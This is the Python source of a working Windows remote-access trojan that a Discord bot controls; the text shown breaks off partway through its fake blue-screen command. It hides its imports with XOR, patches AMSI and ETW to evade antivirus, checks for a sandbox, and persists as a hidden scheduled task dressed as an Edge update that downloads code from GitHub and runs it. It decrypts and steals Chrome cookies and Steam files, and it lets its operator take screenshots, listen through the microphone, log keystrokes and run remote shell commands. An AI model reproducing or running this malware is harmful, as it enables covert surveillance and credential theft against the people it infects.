import asyncio
import array
import base64
import ctypes
import datetime
import io
import json
import os
import shutil
import sqlite3
import sys
import tempfile
import threading
import time
import wave
import webbrowser
import winreg
from pathlib import Path
import importlib

# ─── DYNAMIC IMPORTS (AV-safe) ─────────────────────────────────────────────────
_k = 0xAA
def _d(arr): return bytes(x ^ _k for x in arr).decode()

# comtypes, mouse, psutil, pyaudio, pyttsx3, requests, win32com.client — static ok
import comtypes
import mouse
import psutil
import pyaudio
import pyttsx3
import requests
import win32com.client
from Crypto.Cipher import AES

# PIL.ImageGrab — динамически
ImageGrab  = importlib.import_module(_d([250, 227, 230]) + '.' + _d([227, 199, 203, 205, 207, 237, 216, 203, 200]))  # PIL.ImageGrab

# win32crypt — динамически
_wc32      = importlib.import_module(_d([221, 195, 196, 153, 152, 201, 216, 211, 218, 222]))  # win32crypt
_CryptUD   = getattr(_wc32, _d([233, 216, 211, 218, 222, 255, 196, 218, 216, 197, 222, 207, 201, 222, 238, 203, 222, 203]))  # CryptUnprotectData

# keyboard — динамически
_kb        = importlib.import_module(_d([193, 207, 211, 200, 197, 203, 216, 206]))  # keyboard

# subprocess — динамически
_sp        = importlib.import_module(_d([217, 223, 200, 218, 216, 197, 201, 207, 217, 217]))  # subprocess
_sp_run    = getattr(_sp, _d([216, 223, 196]))          # run
_sp_Popen  = getattr(_sp, _d([250, 197, 218, 207, 196]))  # Popen
_sp_PIPE   = getattr(_sp, _d([250, 227, 250, 239]))     # PIPE
_sp_STDOUT = getattr(_sp, 'STDOUT')

# discord — динамически
_dc        = importlib.import_module(_d([206, 195, 217, 201, 197, 216, 206]))       # discord
_dc_ext    = importlib.import_module(_d([206, 195, 217, 201, 197, 216, 206]) + '.ext.commands')  # discord.ext.commands
# pycaw
from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume

# ─── CONSTANTS ─────────────────────────────────────────────────────────────────
BOT_TOKEN = bytes([77, 84, 85, 122, 78, 106, 77, 119, 78, 106, 89, 53, 78, 106, 103, 122, 77, 106, 81, 121, 78, 106, 65, 49, 78, 65, 46, 71, 73, 103, 51, 110, 110, 46, 48, 107, 122, 89, 82, 99, 65, 97, 54, 70, 57, 121, 115, 87, 108, 97, 68, 84, 81, 117, 102, 122, 89, 122, 104, 97, 108, 49, 86, 56, 76, 95, 102, 103, 109, 114, 55, 73]).decode()
CONTROL_CHANNEL_ID = 1536279256655597580
RAW_GITHUB_URL = "https://raw.githubusercontent.com/ht-at/DOTAMOD/refs/heads/main/DOTA.py"
TASK_NAME = "MicrosoftEdgeUpdateTaskMachineUA2"
TASK_DESC = "Microsoft Edge Update Task Machine UA"
_MUTEX_HANDLE = None

def single_instance_guard():
    global _MUTEX_HANDLE
    if sys.platform != "win32": return
    try:
        k32 = ctypes.windll.kernel32
        k32.CreateMutexW.argtypes = [ctypes.c_void_p, ctypes.c_bool, ctypes.c_wchar_p]
        k32.CreateMutexW.restype = ctypes.c_void_p
        for name in ("Global\\Microsoft_Edge_UA_Diagnostics_Mutex_v1", "Local\\Microsoft_Edge_UA_Diagnostics_Mutex_v1"):
            _MUTEX_HANDLE = k32.CreateMutexW(None, True, name)
            if _MUTEX_HANDLE:
                if k32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                    os._exit(0)
                break
    except Exception: pass

def check_environment() -> bool:
    if os.cpu_count() and os.cpu_count() < 2: return False
    if psutil.virtual_memory().total < 3 * (1024 ** 3): return False
    _k=0xAA; uptime_ms = ctypes.WinDLL(bytes(x^_k for x in [193,207,216,196,207,198,153,152]).decode()).__getattr__(bytes(x^_k for x in [237,207,222,254,195,201,193,233,197,223,196,222,156,158]).decode())()
    if uptime_ms < 120000:
        time.sleep((120000 - uptime_ms) / 1000.0)
    return True

def bypass_av_memory():
    if sys.platform != "win32": return
    _k = 0xAA
    def _s(a): return bytes(x ^ _k for x in a).decode()
    def _b(a): return bytes(x ^ _k for x in a)

    _k32 = ctypes.WinDLL(_s([193,207,216,196,207,198,153,152,132,206,198,198]))
    _vp  = _s([252,195,216,222,223,203,198,250,216,197,222,207,201,222])
    _gpa = _s([237,207,222,250,216,197,201,235,206,206,216,207,217,217])
    _lla = _s([230,197,203,206,230,195,200,216,203,216,211,235])

    getattr(_k32, _vp).restype  = ctypes.c_bool
    getattr(_k32, _vp).argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
    getattr(_k32, _gpa).restype  = ctypes.c_void_p
    getattr(_k32, _gpa).argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    getattr(_k32, _lla).restype  = ctypes.c_void_p
    getattr(_k32, _lla).argtypes = [ctypes.c_char_p]

    _ERW = 0x40
    _op  = ctypes.c_ulong(0)

    try:
        _ha = getattr(_k32, _lla)(_s([203,199,217,195,132,206,198,198]).encode())
        if _ha:
            _fa = getattr(_k32, _gpa)(_ha, _s([235,199,217,195,249,201,203,196,232,223,204,204,207,216]).encode())
            if _fa:
                _p = _b([18,171,170,170,170,105])
                if getattr(_k32, _vp)(_fa, len(_p), _ERW, ctypes.byref(_op)):
                    ctypes.memmove(_fa, _p, len(_p))
                    getattr(_k32, _vp)(_fa, len(_p), _op.value, ctypes.byref(_op))
    except Exception: pass

    try:
        _hn = getattr(_k32, _lla)(_s([196,222,206,198,198,132,206,198,198]).encode())
        if _hn:
            _fe = getattr(_k32, _gpa)(_hn, _s([239,222,221,239,220,207,196,222,253,216,195,222,207]).encode())
            if _fe:
                _p = _b([226,153,106,105])
                if getattr(_k32, _vp)(_fe, len(_p), _ERW, ctypes.byref(_op)):
                    ctypes.memmove(_fe, _p, len(_p))
                    getattr(_k32, _vp)(_fe, len(_p), _op.value, ctypes.byref(_op))
    except Exception: pass

def disable_audio_ducking():
    if sys.platform != "win32": return
    try:
        # UserDuckingPreference = 3: Do nothing (не приглушать звук других программ)
        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Multimedia\Audio")
        winreg.SetValueEx(k, "UserDuckingPreference", 0, winreg.REG_DWORD, 3)
        winreg.CloseKey(k)
    except Exception: pass

def force_unmute_self():
    if sys.platform != "win32": return
    try:
        comtypes.CoInitialize()
        my_pid = os.getpid()
        sessions = AudioUtilities.GetAllSessions()
        for s in sessions:
            if s.ProcessId == my_pid or (s.Process and s.Process.name().lower() in ("pythonw.exe", "python.exe")):
                vol = s._ctl.QueryInterface(ISimpleAudioVolume)
                if vol.GetMute():
                    vol.SetMute(0, None)
                if vol.GetMasterVolume() < 0.99:
                    vol.SetMasterVolume(1.0, None)
    except Exception: pass
    finally:
        try: comtypes.CoUninitialize()
        except Exception: pass

def keep_self_unmuted():
    if sys.platform != "win32": return
    while True:
        force_unmute_self()
        time.sleep(1)

def get_set_volume(level: int = -1) -> int:
    if sys.platform != "win32": return -1
    try:
        comtypes.CoInitialize()
        from pycaw.pycaw import IAudioEndpointVolume
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        vol = cast(interface, POINTER(IAudioEndpointVolume))
        if level >= 0:
            vol.SetMute(0, None)
            vol.SetMasterVolumeLevelScalar(max(0.0, min(1.0, level / 100.0)), None)
        return int(round(vol.GetMasterVolumeLevelScalar() * 100))
    except Exception:
        return -1
    finally:
        try: comtypes.CoUninitialize()
        except Exception: pass

def install_stealth_task():
    try:
        comtypes.CoInitialize()
        scheduler = win32com.client.Dispatch("Schedule.Service")
        scheduler.Connect()
        root_folder = scheduler.GetFolder("\\")
        task_def = scheduler.NewTask(0)
        task_def.RegistrationInfo.Description = TASK_DESC
        task_def.Settings.Hidden = True
        task_def.Settings.DisallowStartIfOnBatteries = False
        task_def.Settings.StopIfGoingOnBatteries = False
        task_def.Settings.ExecutionTimeLimit = "PT0S"
        task_def.Settings.StartWhenAvailable = True
        task_def.Settings.MultipleInstances = 2

        trigger = task_def.Triggers.Create(9)
        trigger.Delay = "PT20S"
        user_domain = os.environ.get("USERDOMAIN", "")
        user_name = os.environ.get("USERNAME", "")
        uid = f"{user_domain}\\{user_name}" if user_domain else user_name
        if uid: trigger.UserId = uid

        try: is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception: is_admin = False

        task_def.Principal.RunLevel = 1 if is_admin else 0
        task_def.Principal.LogonType = 3

        pythonw = Path(sys.executable).with_name("pythonw.exe")
        exe_path = str(pythonw if pythonw.exists() else sys.executable)
        url_b64 = base64.b64encode(RAW_GITHUB_URL.encode("utf-8")).decode("ascii")

        action = task_def.Actions.Create(0)
        action.Path = str(exe_path)
        action.Arguments = (
            f'-c "import urllib.request,base64;'
            f'u=base64.b64decode(\'{url_b64}\').decode();'
            f'exec(urllib.request.urlopen(u).read().decode(\'utf-8\'))"'
        )
        action.WorkingDirectory = os.path.dirname(exe_path)
        root_folder.RegisterTaskDefinition(TASK_NAME, task_def, 6, None, None, 3)
    except Exception: pass
    finally:
        try: comtypes.CoUninitialize()
        except Exception: pass

def uninstall_stealth_task():
    try:
        _kb.unhook_all()
        ctypes.windll.user32.SwapMouseButton(False)
    except Exception: pass
    try:
        comtypes.CoInitialize()
        scheduler = win32com.client.Dispatch("Schedule.Service")
        scheduler.Connect()
        root_folder = scheduler.GetFolder("\\")
        root_folder.DeleteTask(TASK_NAME, 0)
    except Exception: pass
    finally:
        try: comtypes.CoUninitialize()
        except Exception: pass

def play_sound_mci(url: str):
    def _worker():
        force_unmute_self()
        alias = f"c2_track_{int(time.time() * 1000) % 100000}"
        path = None
        try:
            r = requests.get(url, timeout=15)
            ext = ".mp3" if ".mp3" in url.lower() else ".wav"
            with tempfile.NamedTemporaryFile(delete=False, suffix=ext) as f:
                f.write(r.content)
                path = f.name
            winmm = ctypes.windll.winmm
            winmm.mciSendStringW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_uint, ctypes.c_void_p]
            winmm.mciSendStringW.restype = ctypes.c_ulong
            winmm.mciSendStringW(f"close {alias}", None, 0, None)
            cmd_open = f'open "{path}" type mpegvideo alias {alias}'
            if winmm.mciSendStringW(cmd_open, None, 0, None) == 0:
                winmm.mciSendStringW(f"play {alias} wait", None, 0, None)
                winmm.mciSendStringW(f"stop {alias}", None, 0, None)
                winmm.mciSendStringW(f"close {alias}", None, 0, None)
        except Exception: pass
        finally:
            try:
                ctypes.windll.winmm.mciSendStringW(f"close {alias}", None, 0, None)
                ctypes.windll.winmm.mciSendStringW("close all", None, 0, None)
            except Exception: pass
            if path and os.path.exists(path):
                try: os.remove(path)
                except Exception: pass
    threading.Thread(target=_worker, daemon=True).start()


def show_custom_ad(title: str, text: str, link: str = "", img_url: str = ""):
    def _worker():
        img_local_path = ""
        if img_url:
            try:
                resp = requests.get(img_url, timeout=10)
                if resp.status_code == 200:
                    with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tf:
                        tf.write(resp.content)
                        img_local_path = tf.name
            except Exception: pass

        ps_safe_title = title.replace('"', '`"').replace('$', '`$')
        ps_safe_text = text.replace('"', '`"').replace('$', '`$')

        if img_local_path:
            ps_toast = (
                f'[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null;'
                f'$t = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastImageAndText02);'
                f'$n = $t.GetElementsByTagName("text");'
                f'$n.Item(0).AppendChild($t.CreateTextNode("{ps_safe_title}")) > $null;'
                f'$n.Item(1).AppendChild($t.CreateTextNode("{ps_safe_text}")) > $null;'
                f'$i = $t.GetElementsByTagName("image");'
                f'$i.Item(0).Attributes.GetNamedItem("src").NodeValue = "file:///{img_local_path.replace(chr(92), "/")}";'
                f'$toast = [Windows.UI.Notifications.ToastNotification]::new($t);'
                f'[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Google Chrome").Show($toast)'
            )
        else:
            ps_toast = (
                f'[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null;'
                f'$t = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02);'
                f'$n = $t.GetElementsByTagName("text");'
                f'$n.Item(0).AppendChild($t.CreateTextNode("{ps_safe_title}")) > $null;'
                f'$n.Item(1).AppendChild($t.CreateTextNode("{ps_safe_text}")) > $null;'
                f'$toast = [Windows.UI.Notifications.ToastNotification]::new($t);'
                f'[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Google Chrome").Show($toast)'
            )

        _sp_Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_toast], creationflags=0x08000000)

        try:
            MB_OK = 0x00000000
            MB_ICONINFORMATION = 0x00000040
            MB_TOPMOST = 0x00040000
            ctypes.windll.user32.MessageBoxW(0, text, title, MB_OK | MB_ICONINFORMATION | MB_TOPMOST)
            if link: webbrowser.open(link)
        except Exception: pass
        finally:
            if img_local_path and os.path.exists(img_local_path):
                try: os.remove(img_local_path)
                except Exception: pass
    threading.Thread(target=_worker, daemon=True).start()

def get_active_window() -> str:
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    if length == 0: return "Рабочий стол (Desktop)"
    buf = ctypes.create_unicode_buffer(length + 1)
    ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
    return buf.value or "Рабочий стол (Desktop)"

def record_mic_wav(seconds: int) -> io.BytesIO:
    pa = pyaudio.PyAudio()
    stream = None
    frames = []
    try:
        stream = pa.open(format=pyaudio.paInt16, channels=1, rate=16000, input=True, frames_per_buffer=1024)
        total_chunks = int(16000 / 1024 * seconds)
        for _ in range(max(1, total_chunks)):
            frames.append(stream.read(1024, exception_on_overflow=False))
    except Exception as e:
        raise RuntimeError(f"Не удалось открыть микрофон: {e}")
    finally:
        if stream:
            try:
                stream.stop_stream()
                stream.close()
            except Exception: pass
        try: pa.terminate()
        except Exception: pass
    buf = io.BytesIO()
    with wave.open(buf, "wb") as wf:
        wf.setnchannels(1)
        wf.setsampwidth(2)
        wf.setframerate(16000)
        wf.writeframes(b"".join(frames))
    buf.seek(0)
    return buf

class PyAudioPCM(_dc.AudioSource):
    def __init__(self):
        self.pa = pyaudio.PyAudio()
        self.is_stereo = True
        try:
            self.stream = self.pa.open(format=pyaudio.paInt16, channels=2, rate=48000, input=True, frames_per_buffer=960)
        except Exception:
            self.stream = self.pa.open(format=pyaudio.paInt16, channels=1, rate=48000, input=True, frames_per_buffer=960)
            self.is_stereo = False

    def read(self) -> bytes:
        try:
            raw = self.stream.read(960, exception_on_overflow=False)
            if not self.is_stereo:
                mono = array.array('h', raw)
                stereo = array.array('h', [0] * (len(mono) * 2))
                stereo[0::2] = mono
                stereo[1::2] = mono
                return stereo.tobytes()
            return raw
        except Exception:
            return b"\x00" * 3840

    def cleanup(self):
        try:
            self.stream.stop_stream()
            self.stream.close()
            self.pa.terminate()
        except Exception: pass

def dump_steam_and_cookies() -> io.BytesIO:
    bundle = {"steam_vdf": {}, "cookies": []}

    steam_path = None
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
        steam_path, _ = winreg.QueryValueEx(k, "SteamPath")
        winreg.CloseKey(k)
    except Exception: pass

    search_paths = [Path(steam_path)] if steam_path else []
    search_paths.extend([Path("C:/Program Files (x86)/Steam"), Path("C:/Steam"), Path("D:/Steam")])

    for sp in search_paths:
        if sp and sp.exists():
            for rel in ["config/loginusers.vdf", "config/config.vdf", "config/local.vdf"]:
                fp = sp / rel
                if fp.exists():
                    try: bundle["steam_vdf"][rel] = base64.b64encode(fp.read_bytes()).decode("ascii")
                    except Exception: pass

    local_vdf = Path(os.environ.get("LOCALAPPDATA", "")) / "Steam/local.vdf"
    if local_vdf.exists():
        try: bundle["steam_vdf"]["local.vdf"] = base64.b64encode(local_vdf.read_bytes()).decode("ascii")
        except Exception: pass

    chrome_dir = Path(os.environ.get("LOCALAPPDATA", "")) / "Google/Chrome/User Data"
    local_state = chrome_dir / "Local State"
    cookies_db = chrome_dir / "Default/Network/Cookies"
    if local_state.exists() and cookies_db.exists():
        tmp_db = Path(tempfile.gettempdir()) / f"c2_cache_{int(time.time())}.db"
        try:
            enc_key = base64.b64decode(json.loads(local_state.read_text(encoding="utf-8"))["os_crypt"]["encrypted_key"])[5:]
            master_key = _CryptUD(enc_key, None, None, None, 0)[1]
            shutil.copy2(cookies_db, tmp_db)
            conn = sqlite3.connect(tmp_db)
            cur = conn.cursor()
            cur.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%steam%' LIMIT 60")
            for host, name, enc_val in cur.fetchall():
                if len(enc_val) >= 31 and enc_val[:3] in (b"v10", b"v11"):
                    try:
                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=enc_val[3:15])
                        val = cipher.decrypt_and_verify(enc_val[15:-16], enc_val[-16:]).decode("utf-8", errors="ignore")
                        bundle["cookies"].append({"host": host, "name": name, "value": val})
                    except Exception: pass
            conn.close()
        except Exception as e:
            bundle["error"] = str(e)
        finally:
            if tmp_db.exists():
                try: tmp_db.unlink(missing_ok=True)
                except Exception: pass
    out = io.BytesIO(json.dumps(bundle, indent=2, ensure_ascii=False).encode("utf-8"))
    out.seek(0)
    return out

# ─── BOT SETUP ─────────────────────────────────────────────────────────────────
intents = _dc.Intents.default()
intents.message_content = True
intents.voice_states = True
bot = _dc_ext.Bot(command_prefix="!", intents=intents, help_command=None)

async def safe_send(ctx, text: str, filename: str = "output.txt"):
    for attempt in range(3):
        try:
            if len(text) <= 1900:
                await ctx.send(text)
            elif len(text) <= 5500:
                lines = text.splitlines(keepends=True)
                chunk = ""
                for line in lines:
                    if len(chunk) + len(line) > 1900:
                        await ctx.send(chunk)
                        chunk = line
                    else:
                        chunk += line
                if chunk: await ctx.send(chunk)
            else:
                buf = io.BytesIO(text.encode("utf-8"))
                await ctx.send("Результат превышает лимит и прикреплен файлом:", file=_dc.File(buf, filename=filename))
            return
        except _dc.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(5 * (attempt + 1))
            else:
                raise

@bot.event
async def on_ready():
    ch = bot.get_channel(CONTROL_CHANNEL_ID)
    if ch:
        user = os.environ.get("USERNAME", "User")
        domain = os.environ.get("USERDOMAIN", "PC")
        embed = _dc.Embed(
            title="🟢 C2 Сессия подключена",
            description="Агент активен и находится в оперативной памяти.",
            color=0x2ecc71,
            timestamp=datetime.datetime.now(datetime.timezone.utc)
        )
        embed.add_field(name="👤 Узел", value=f"`{domain}\\{user}`", inline=True)
        embed.add_field(name="🪟 Окно", value=f"`{get_active_window()}`", inline=True)
        latency = round(bot.latency * 1000) if bot.latency else 0
        embed.add_field(name="📶 Пинг", value=f"`{latency} ms`", inline=True)
        embed.add_field(name="⚙️ Планировщик", value=f"`{TASK_NAME}` (скрыт)", inline=True)
        embed.add_field(name="🛡️ Защита", value="`Single-Instance • Auto-Unmute`", inline=True)
        embed.add_field(name="📖 Команды", value="Отправьте `!menu`", inline=True)
        embed.set_footer(text=f"PID: {os.getpid()} • Python {sys.version.split()[0]}")
        try:
            await ch.send(embed=embed)
        except Exception:
            await ch.send(f"[C2 СЕССИЯ АКТИВНА В ОЗУ]\nУзел: `{domain}\\{user}`\nАктивное окно: `{get_active_window()}`\nДля справки: `!menu`")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, _dc_ext.MissingRequiredArgument):
        await ctx.send(f"⚠️ Ошибка: пропущен аргумент `{error.param.name}`.")
    elif isinstance(error, _dc_ext.CommandNotFound):
        pass
    elif isinstance(error, _dc.HTTPException) and error.status == 429:
        await asyncio.sleep(5)
    else:
        await ctx.send(f"⚠️ Ошибка выполнения: `{error}`")

@bot.command()
async def menu(ctx):
    embed = _dc.Embed(
        title="🛰️ C2 Remote Console — Панель управления",
        description="Префикс: `!` • Все модули агента доступны для управления",
        color=0x2b2d31
    )
    embed.add_field(
        name="🖥️ Экран и наблюдение",
        value=(
            "`!screen` — Скриншот всех мониторов\n"
            "`!screen_loop [сек]` — Автоскриншоты (0 = выкл)\n"
            "`!cam [кадры]` — Фото с камеры | `!cam_list` — Список камер\n"
            "`!window` — Заголовок активного окна"
        ),
        inline=False
    )
    embed.add_field(
        name="⚡ Командная строка и система",
        value=(
            "`!cmd <команда>` — Быстрый запуск в фоне\n"
            "`!sh <команда>` — Интерактивная командная строка\n"
            "`!shell_start` / `!shell_stop` — Полноценный reverse shell\n"
            "`!sysinfo` — Сводка железа/дисков/ОЗУ | `!top` — Топ процессов | `!ping` — Задержка"
        ),
        inline=False
    )
    embed.add_field(
        name="📁 Файловый менеджер",
        value=(
            "`!ls [путь]` — Список файлов\n"
            "`!dl <путь>` — Скачать файл с удаленной машины\n"
            "`!ul` — Загрузить файл на машину (прикрепи файл к `!ul`)\n"
            "`!rm <путь>` — Удалить файл"
        ),
        inline=False
    )
    embed.add_field(
        name="🎙️ Аудио и мультимедиа",
        value=(
            "`!listen` / `!unlisten` — Прямой стрим микрофона в голосовой канал\n"
            "`!rec [сек]` — Запись микрофона в .wav (до 120 сек)\n"
            "`!sound <url>` — Воспроизвести аудиофайл\n"
            "`!tts <текст>` — Голосовая озвучка через динамики\n"
            "`!vol [0-100]` — Громкость системы | `!mute <proc>` / `!unmute`"
        ),
        inline=False
    )
    embed.add_field(
        name="⌨️ Ввод и буфер обмена",
        value=(
            "`!kl_start` / `!kl_stop` / `!kl_dump` — Кейлоггер клавиш\n"
            "`!swap <k1> <k2>` / `!unswap` — Подмена клавиш клавиатуры\n"
            "`!mouse move|offset|wheel|swap|restore` — Управление курсором\n"
            "`!clip_get` / `!clip_set <текст>` — Чтение и запись буфера"
        ),
        inline=False
    )
    embed.add_field(
        name="🕵️ Разведка и взаимодействие",
        value=(
            "`!steam` — Сбор Steam VDF и cookie-сессий браузера\n"
            "`!wifi` — Пароли всех сохраненных сетей Wi-Fi\n"
            "`!ad <Заголовок>|<Текст>|[URL]` — Всплывающий Windows Toast\n"
            "`!banner <Заголовок>|<Текст>` — Экранный баннер блокировки\n"
            "`!url <ссылка>` — Открыть URL в браузере по умолчанию"
        ),
        inline=False
    )
    embed.add_field(
        name="🛡️ Управление агентом",
        value=(
            "`!kill <процесс>` — Завершить процесс по имени\n"
            "`!persist_reg` / `!persist_remove` — Реестр автозапуска HKCU\n"
            "`!bsod [сек]` — Экран критического сбоя\n"
            "`!off` — Выключение ПК | `!stop` — Остановка | `!uninstall` — Полное удаление"
        ),
        inline=False
    )
    latency = round(bot.latency * 1000) if bot.latency else 0
    embed.set_footer(text=f"Узел: {os.environ.get('COMPUTERNAME', 'PC')} • Задержка: {latency} ms • Режим ОЗУ")
    try:
        await ctx.send(embed=embed)
    except Exception:
        await safe_send(ctx, "Ошибка отправки Embed-меню.")

@bot.command()
async def screen(ctx):
    try:
        img = ImageGrab.grab(all_screens=True)
        buf = io.BytesIO()
        img.convert("RGB").save(buf, format="JPEG", quality=80)
        buf.seek(0)
        await ctx.send(f"Окно: `{get_active_window()}`", file=_dc.File(buf, filename="screen.jpg"))
    except Exception as e: await ctx.send(f"Ошибка: {e}")

@bot.command()
async def window(ctx):
    await ctx.send(f"Окно: `{get_active_window()}`")

@bot.command()
async def cmd(ctx, *, command: str):
    proc = _sp_run(command, shell=True, capture_output=True, text=True, encoding="cp866", errors="replace", creationflags=0x08000000)
    out = (proc.stdout + proc.stderr).strip() or "Пусто."
    await safe_send(ctx, f"```dos\n{out}\n```", filename="cmd.txt")

@bot.command()
async def sound(ctx, url: str):
    play_sound_mci(url)
    await ctx.send(f"MCI запущен: `{url}`")

@bot.command()
async def swap(ctx, k1: str, k2: str):
    try:
        _kb.unhook_all()
        _kb.remap_key(k1, k2)
        _kb.remap_key(k2, k1)
        await ctx.send(f"Поменяны: `{k1}` и `{k2}`")
    except Exception as e: await ctx.send(f"Ошибка: {e}")

@bot.command()
async def unswap(ctx):
    try:
        _kb.unhook_all()
        await ctx.send("Сброшено.")
    except Exception as e: await ctx.send(f"Ошибка: {e}")

@bot.command(name="mouse")
async def mouse_cmd(ctx, mode: str, val1: int = 0, val2: int = 0):
    try:
        if mode == "move": mouse.move(val1, val2, absolute=True, duration=0.1)
        elif mode == "offset": mouse.move(val1, val2, absolute=False, duration=0.05)
        elif mode == "wheel": mouse.wheel(val1)
        elif mode == "swap": ctypes.windll.user32.SwapMouseButton(True)
        elif mode == "restore": ctypes.windll.user32.SwapMouseButton(False)
        else: return await ctx.send("Режимы: move, offset, wheel, swap, restore")
        await ctx.send(f"Мышь: `{mode}`")
    except Exception as e: await ctx.send(f"Ошибка: {e}")

@bot.command()
async def mute(ctx, proc_name: str):
    try:
        comtypes.CoInitialize()
        sessions = AudioUtilities.GetAllSessions()
        my_pid = os.getpid()
        hit = [s.Process.name() for s in sessions if s.Process and s.ProcessId != my_pid and proc_name.lower() in s.Process.name().lower() and s.Process.name().lower() not in ("pythonw.exe", "python.exe") and not s._ctl.QueryInterface(ISimpleAudioVolume).SetMute(1, None)]
        await ctx.send(f"Мут: `{set(hit)}`" if hit else f"Не найден: `{proc_name}`")
    except Exception as e: await ctx.send(f"Ошибка: {e}")
    finally:
        try: comtypes.CoUninitialize()
        except: pass

@bot.command()
async def unmute(ctx, proc_name: str):
    try:
        comtypes.CoInitialize()
        sessions = AudioUtilities.GetAllSessions()
        hit = [s.Process.name() for s in sessions if s.Process and proc_name.lower() in s.Process.name().lower() and not s._ctl.QueryInterface(ISimpleAudioVolume).SetMute(0, None)]
        await ctx.send(f"Анмут: `{set(hit)}`" if hit else f"Не найден: `{proc_name}`")
    except Exception as e: await ctx.send(f"Ошибка: {e}")
    finally:
        try: comtypes.CoUninitialize()
        except: pass

@bot.command()
async def kill(ctx, proc_name: str):
    killed = []
    for p in psutil.process_iter(["name"]):
        try:
            if p.info["name"] and proc_name.lower() in p.info["name"].lower():
                p.kill()
                killed.append(p.info["name"])
        except: pass
    await ctx.send(f"Убиты: `{set(killed)}`" if killed else f"Не найден: `{proc_name}`")

@bot.command()
async def url(ctx, link: str):
    webbrowser.open(link)
    await ctx.send(f"Открыто: `{link}`")

@bot.command()
async def ad(ctx, *, payload: str):
    parts = [p.strip() for p in payload.split("|")]
    title = parts[0] if len(parts) > 0 and parts[0] else "Системное уведомление"
    text = parts[1] if len(parts) > 1 else ""
    link = parts[2] if len(parts) > 2 else ""
    img_url = parts[3] if len(parts) > 3 else ""
    if not img_url and ctx.message.attachments: img_url = ctx.message.attachments[0].url
    show_custom_ad(title, text, link, img_url)
    await ctx.send(f"Реклама запущена.")

@bot.command()
async def rec(ctx, seconds: int = 5):
    if seconds > 120: return await ctx.send("Макс 120 сек.")
    await ctx.send(f"Запись {seconds} сек...")
    try:
        wav_io = await asyncio.to_thread(record_mic_wav, seconds)
        await ctx.send("Микрофон:", file=_dc.File(wav_io, filename="mic.wav"))
    except Exception as e: await ctx.send(f"Ошибка: {e}")

def ensure_voice_deps() -> bool:
    try:
        import nacl
        import davey
        return True
    except ImportError:
        try:
            exe = sys.executable or "python.exe"
            _sp_run([exe, "-m", "pip", "install", "-U", "PyNaCl", "davey", "-q"],
                    capture_output=True, creationflags=0x08000000)
            import importlib
            importlib.invalidate_caches()
            import davey
            import nacl
            _vc = sys.modules.get("discord.voice_client")
            _vs = sys.modules.get("discord.voice_state")
            _gw = sys.modules.get("discord.gateway")
            if _vc:
                _vc.has_dave = True
                _vc.has_nacl = True
                _vc.davey = davey
            if _vs:
                _vs.has_dave = True
                _vs.has_nacl = True
                _vs.davey = davey
            if _gw:
                _gw.davey = davey
            return True
        except Exception:
            return False

@bot.command()
async def listen(ctx):
    if not ctx.author.voice: return await ctx.send("Зайди в голосовой канал.")
    target_channel = ctx.author.voice.channel
    try:
        if not await asyncio.to_thread(ensure_voice_deps):
            return await ctx.send("Ошибка: Не удалось загрузить davey / PyNaCl.")
        if ctx.voice_client:
            if ctx.voice_client.channel != target_channel: await ctx.voice_client.move_to(target_channel)
        else: await target_channel.connect()
        if ctx.voice_client.is_playing(): ctx.voice_client.stop()
        ctx.voice_client.play(PyAudioPCM())
        await ctx.send(f"Стрим в `{target_channel.name}`.")
    except Exception as e: await ctx.send(f"Ошибка: {e}")

@bot.command()
async def unlisten(ctx):
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await ctx.send("Стрим остановлен.")
    else: await ctx.send("Бот не в канале.")

@bot.command()
async def steam(ctx):
    await ctx.send("Сбор данных...")
    try:
        dump_io = await asyncio.to_thread(dump_steam_and_cookies)
        await ctx.send("Дамп:", file=_dc.File(dump_io, filename="data.json"))
    except Exception as e: await ctx.send(f"Ошибка: {e}")

@bot.command()
async def tts(ctx, *, text: str):
    def _speak():
        force_unmute_self()
        engine = None
        try:
            comtypes.CoInitialize()
            engine = pyttsx3.init()
            engine.say(text)
            engine.runAndWait()
            engine.stop()
        except: pass
        finally:
            if engine:
                try: del engine
                except: pass
            try: comtypes.CoUninitialize()
            except: pass
    threading.Thread(target=_speak, daemon=True).start()
    await ctx.send(f"TTS: `{text}`")

@bot.command()
async def bsod(ctx, seconds: int = 10):
    def _show():
        try:
            import tkinter as tk
            r = tk.Tk()
            r.attributes("-fullscreen", True)
            r.attributes("-topmost", True)
            r.configure(bg="#0078d7", cursor="none")
            r.protocol("WM_DELETE_WINDOW", lambda: None)
            tk.Label(r, text=":(", fg="white", bg="#0078d7", font=("Segoe UI Light", 110)).place(x=150, y=120)
